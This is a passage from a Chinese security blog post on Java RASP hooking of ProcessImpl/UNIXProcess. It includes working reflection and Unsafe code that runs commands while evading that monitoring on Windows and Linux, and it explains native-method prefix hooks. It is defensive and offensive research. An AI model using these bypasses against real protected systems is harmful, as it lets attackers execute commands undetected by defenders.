bytes;</span><br><span class="line">           &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这时候执行的所有命令都会变成 calc ，证明方法调用拦截成功。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240319131745046.png"
+                      alt="image-20240319131745046"
+                ></p>
+<h3 id="UNIXProcess-ProcessImpl"><a href="#UNIXProcess-ProcessImpl" class="headerlink" title="UNIXProcess&#x2F;ProcessImpl"></a>UNIXProcess&#x2F;ProcessImpl</h3><p>一般来说RASP技术（OpenRASP）都会hook UNIXProcess&#x2F;ProcessImpl 类来实现对命令执行函数的的监控，因为这里是Java层最底层的类，也是Java层监控的极限，但是攻击者可以反射调用forkAndExec这个native方法或者利用JNI来调用一个自己实现命令执行函数的动态链接库进行利用。JNI 绕过 Rasp 后续再讨论，这里介绍反射的方式。</p>
+<h4 id="简单-rasp-检测"><a href="#简单-rasp-检测" class="headerlink" title="简单 rasp 检测"></a>简单 rasp 检测</h4><p>现在我们监控 UNIXProcess&#x2F;ProcessImpl 类，这已经是 Java 层监控的极限了，修改后的 agent 如下：</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Hook._ProcessImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] targetClassNameArray = &#123;<span class="string">&quot;java.lang.ProcessImpl&quot;</span> , <span class="string">&quot;java.lang.UNIXProcess&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> &#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> <span class="title class_">AgentDemo</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class[] classes = instrumentation.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (Arrays.asList(targetClassNameArray).contains(clas.getName()))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    instrumentation.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Arrays.asList(targetClassNameArray).contains(className)) &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clazz = pool.getCtClass(className);</span><br><span class="line">                CtConstructor[] method = clazz.getDeclaredConstructors();</span><br><span class="line">                method[<span class="number">0</span>].insertBefore(<span class="string">&quot;&#123;System.out.println(\&quot;&quot;</span>+ className +<span class="string">&quot; 类被初始化\&quot;);&#125;&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="Windows-绕过"><a href="#Windows-绕过" class="headerlink" title="Windows 绕过"></a>Windows 绕过</h4><p>对于 Windows 环境，根据上面的内容可以知道调用的是 java.lang.ProcessImpl#create 方法，而这个方法是静态方法，不需要实例化对象就可以调用。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240319145212870.png"
+                      alt="image-20240319145212870"
+                ></p>
+<p>以下代码是绕过的例子：</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Hook._ProcessImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">_Windows_Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;./src/main/java/Hook/_ProcessImpl/jars/agentmain.jar&quot;</span>;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor v:list)&#123;</span><br><span class="line">            <span class="keyword">if</span> (v.displayName().contains(<span class="string">&quot;_Windows_Demo&quot;</span>))&#123;</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(v.id());</span><br><span class="line">                vm.loadAgent(path);</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;---- 直接调用 Runtime ----&quot;</span>);</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;---- 绕过操作 ----&quot;</span>);</span><br><span class="line">                bypass_hook(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;---- 直接调用 Runtime ----&quot;</span>);</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"></span><br><span class="line">                vm.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bypass_hook</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdstr</span> <span class="operator">=</span> cmd;</span><br><span class="line">        <span class="type">String</span> <span class="variable">envblock</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">long</span>[] stdHandles = <span class="keyword">new</span> <span class="title class_">long</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">// 这里将 redirectErrorStream 设置为 true 以便于将错误输出重定向到标准输出</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">redirectErrorStream</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">create</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;create&quot;</span>, String.class, String.class, String.class, <span class="type">long</span>[].class, <span class="type">boolean</span>.class);</span><br><span class="line">        create.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 由于 create 方法是静态方法，甚至都不用实例化对象就行。</span></span><br><span class="line">        create.invoke(<span class="literal">null</span>, cmdstr, envblock, dir, stdHandles, redirectErrorStream);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可以发现成功弹出了计算器，并且通过控制台的输出结果可以发现我们的命令调用并没有被 rasp 拦截到，成功的绕过了检测。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240320220504191.png"
+                      alt="image-20240320220504191"
+                ></p>
+<h4 id="Linux-绕过"><a href="#Linux-绕过" class="headerlink" title="Linux 绕过"></a>Linux 绕过</h4><p>Linux 下主要调用的是 forkAndExec 方法，但是 forkAndExec 并不和 Windows 下的 create 方法那样是静态方法，其函数声明如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240320221410169.png"
+                      alt="image-20240320221410169"
+                > </p>
+<p>正常反射调用 forkAndExec 方法就不能仅通过传入 null 来实现了，需要我们实例化一个 UNIXprocess 对象，而这个实例化操作肯定就会被 rasp 拦截到了，但是我们可以通过 Unsafe 类的 allocateInstance 方法在不调用 UNIXProcess&#x2F;ProcessImpl 构造方法情况下生成实例。以下是绕过 rasp 的方法示例（forkAndExec 参数属实有点多。。。）</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bypass_hook_linux</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           processClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">           processClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="type">Object</span> <span class="variable">processObject</span> <span class="operator">=</span> unsafe_getObject(processClass);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="type">Object</span> <span class="variable">launchMechanism</span> <span class="operator">=</span> getFieldValue(processObject, <span class="string">&quot;launchMechanism&quot;</span>);</span><br><span class="line">       <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> ((<span class="type">int</span>) launchMechanism.getClass().getMethod(<span class="string">&quot;ordinal&quot;</span>).invoke(launchMechanism)) + <span class="number">1</span>;</span><br><span class="line">       <span class="type">byte</span>[] helperpath = getFieldValue(processObject, <span class="string">&quot;helperpath&quot;</span>);</span><br><span class="line">       <span class="type">byte</span>[] prog = <span class="keyword">new</span> <span class="title class_">byte</span>[cmd.getBytes().length + <span class="number">1</span>];</span><br><span class="line">       System.arraycopy(cmd.getBytes(), <span class="number">0</span>, prog, <span class="number">0</span>, cmd.getBytes().length);</span><br><span class="line">       <span class="type">byte</span>[] argBlock = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">       <span class="type">int</span> <span class="variable">argc</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="type">byte</span>[] envBlock = <span class="literal">null</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">envc</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="type">byte</span>[] dir = <span class="literal">null</span>;</span><br><span class="line">       <span class="type">int</span>[] fds = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">       <span class="type">boolean</span> <span class="variable">redirectErrorStream</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="type">Method</span> <span class="variable">forkAndExecMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>, <span class="type">int</span>.class, <span class="type">byte</span>[].class,</span><br><span class="line">               <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>[].class, <span class="type">boolean</span>.class);</span><br><span class="line">       forkAndExecMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       forkAndExecMethod.invoke(processObject, ordinal, helperpath, prog, argBlock, argc,</span><br><span class="line">               envBlock, envc, dir, fds, redirectErrorStream);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">unsafe_getObject</span><span class="params">(Class&lt;? <span class="built_in">super</span> T&gt; objectClass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">       unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="keyword">return</span> (T) ((Unsafe) unsafeField.get(<span class="literal">null</span>)).allocateInstance(objectClass);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>运行后和 windows 绕过的情况一样，成功弹出记事本，而没有触发检测</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240321191830788.png"
+                      alt="image-20240321191830788"
+                ></p>
+<h3 id="native"><a href="#native" class="headerlink" title="native"></a>native</h3><h4 id="hook-原理解析"><a href="#hook-原理解析" class="headerlink" title="hook 原理解析"></a>hook 原理解析</h4><p>因为native方法在class中字节码就是空的，所以我们使用 rasp 从修改方法体来说貌似就没办法防御住上面的绕过方式的。</p>
+<p>但是在 JVMTI 中提供了一个方法setNativeMethodPrefix，可以用来设置native方法的解析前缀。</p>
+<p>Java无法直接访问到操作系统底层如硬件系统，为此 Java提供了JNI来实现对于底层的访问。JNI，Java Native Interface，它是Java的SDK一部分，JNI允许Java代码使用以其他语言编写的代码和代码库，本地程序中的函数也可以调用Java层的函数，即 JNI 实现了 Java 和本地代码间的双向交互。Java不能直接调用系统函数，而是通过 forkAndExec 这个 native 函数（Linux 下）调用其用本地代码实现的方法：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/JetBrains/jdk8u_jdk/blob/master/src/solaris/native/java/lang/UNIXProcess_md.c#L566" >https://github.com/JetBrains/jdk8u_jdk/blob/master/src/solaris/native/java/lang/UNIXProcess_md.c#L566 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240321204310963.png"
+                      alt="image-20240321204310963"
+                ></p>
+<p>可以看出 native 方法解析到本地方法函数是由Java类的包名称和方法名称组成，这个规则这称之为：standard resolution（标准解析）。</p>
+<p>通过 setNativeMethodPrefix 函数对 ClassFileTransformer 设置 native prefix，此时 JVM 将会使用动态解析方式。</p>
+<p>比如，现有一个native方法在标准解析下为：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">native boolean foo(int x); ====&gt; Java_somePackage_someClass_foo(JNIEnv* env, jint x);</span><br></pre></td></tr></table></figure></div>
+
+<p>通过setNativeMethodPrefix函数设置了native prefix，且prefix为”wrapped_”</p>
+<p>那么解析关系就会变为：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">native boolean wrapped_foo(int x); ====&gt; Java_somePackage_someClass_foo(JNIEnv* env, jint x);</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/native_implemention.3566ed08.png"
+                      alt="img.png"
+                ></p>
+<p>一旦可以找到对应的native实现，那么调用这个函数，整个解析过程就结束了；</p>
+<p>如果没有找到，那么虚拟机将会做依次进行下面的解析工作（method 指的是 native 方法，nativeImplementation 指的是 C&#x2F;C++ 实现的方法）：</p>
+<p>1）method(foo) -&gt; nativeImplementation(foo)</p>
+<p>增加method的prefix，继续：</p>
+<p>2）method(wrapped_foo) -&gt; nativeImplementation(foo)</p>
+<p>增加 nativeImplementation的prefix，继续：</p>
+<p>3）method(wrapped_foo) -&gt; nativeImplementation(wrapped_foo)</p>
+<p>去掉 nativeImplementation 的 prefix，继续：</p>
+<p>4）method(wrapped_foo) -&gt; nativeImplementation(foo)</p>
+<p>如果找到上面的其中一个对应关系，则执行。否则，因为没有任何一个合适的解析方式，则这个过程失败。</p>
+<p><strong>有多个 transformer场景</strong></p>
+<p>虚拟机是按 transformer 被加入到的 Instrumentation 之中的次序去解析的（即addTransformer）。</p>
+<p>假设有三个 transformer 要被加入进来，他们的次序和相对应的 prefix 分别为：transformer1 和“prefix1_”，transformer2 和 “prefix2_”，transformer3 和 “prefix3_”。 虚拟机做的解析规则为 :</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">prefix1_prefix2_prefix3_foo</span><span class="params">(<span class="type">int</span> x)</span>;  ====&gt; Java_somePackage_someClass_foo(JNIEnv* env, jint x);</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>通过上面的过程，其实我们可以了解到当设置前缀后，如果原本的函数仍存在，则不会有任何影响，所以我们需要删除原 native 方法，编写具有前缀的 native 方法，此时第二个解析就能成功了，但是还需要去调用到这个 native 方法，所以我们还需要写一个同名称同参数的原方法，但是不要加上 native 修饰。</p>
+<p>于是我们去 hook 一个 native 方法实际上就是如下过程：</p>
+<ul>
+<li><p>1.移除想要 hook 的 native 方法。</p>
+</li>
+<li><p>2.增加一个 native 方法，这个方法和 hook 的 native 方法除了方法名增加 prefix ，其他相同。</p>
+</li>
+<li><p>3.增加一个和 hook native 方法同名的 java 方法（除去其 native 修饰），其中返回时调用 prefix native方法。</p>
+</li>
+</ul>
+<h4 id="hook-尝试"><a href="#hook-尝试" class="headerlink" title="hook 尝试"></a>hook 尝试</h4><p>agent 代码</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Hook._native;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] targetClassNameArray = &#123;<span class="string">&quot;java.lang.ProcessImpl&quot;</span>, <span class="string">&quot;java.lang.UNIXProcess&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> &#123;</span><br><span class="line">        <span class="type">AgentDemo</span> <span class="variable">transforme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AgentDemo</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">nativePrefix</span> <span class="operator">=</span> <span class="string">&quot;ko1sh1_&quot;</span>;</span><br><span class="line">        instrumentation.addTransformer(transforme, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (instrumentation.isNativeMethodPrefixSupported())&#123;</span><br><span class="line">            instrumentation.setNativeMethodPrefix(transforme, nativePrefix);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;The JVM does not support setting the native method prefix&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class[] classes = instrumentation.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas : classes) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Arrays.asList(targetClassNameArray).contains(clas.getName())) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    instrumentation.retransformClasses(clas);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Arrays.asList(targetClassNameArray).contains(className)) &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    clazz = pool.getCtClass(className);</span><br><span class="line">                    <span class="comment">// 添加新的前缀方法</span></span><br><span class="line">                    <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;long ko1sh1_create(String var1, String var2, String var3, long[] var4, boolean var5);&quot;</span>, clazz);</span><br><span class="line">                    method.setModifiers(Modifier.PRIVATE | Modifier.STATIC | Modifier.SYNCHRONIZED | Modifier.NATIVE);</span><br><span class="line">                    clazz.addMethod(method);</span><br><span class="line">                    <span class="comment">// 移除旧的方法</span></span><br><span class="line">                    <span class="type">CtMethod</span> <span class="variable">method1</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;create&quot;</span>);</span><br><span class="line">                    clazz.removeMethod(method1);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 添加原本的方法，但是不使用 native 修饰</span></span><br><span class="line">                    <span class="type">CtMethod</span> <span class="variable">method2</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;long create(String var1, String var2, String var3, long[] var4, boolean var5) throws java.io.IOException &#123; &quot;</span> +</span><br><span class="line">                            <span class="string">&quot;String a = ($w)$0; &quot;</span> +</span><br><span class="line">                            <span class="string">&quot;String b = ($w)$1; &quot;</span> +</span><br><span class="line">                            <span class="string">&quot;String c = ($w)$2; &quot;</span> +</span><br><span class="line">                            <span 